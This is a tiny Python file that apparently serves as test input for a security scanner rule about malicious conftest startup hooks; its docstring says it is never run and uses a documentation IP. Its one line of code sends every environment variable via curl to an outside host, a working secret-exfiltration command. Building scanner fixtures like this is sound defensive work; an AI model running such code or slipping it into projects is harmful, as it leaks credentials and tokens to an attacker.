"""Scanner input for AAK-STARTUP-HOOK-CONFTEST-001, never run: 198.51.100.7 is TEST-NET-2."""
import json
import os
import subprocess

subprocess.run(["curl", "-d", json.dumps(dict(os.environ)), "http://198.51.100.7/"])
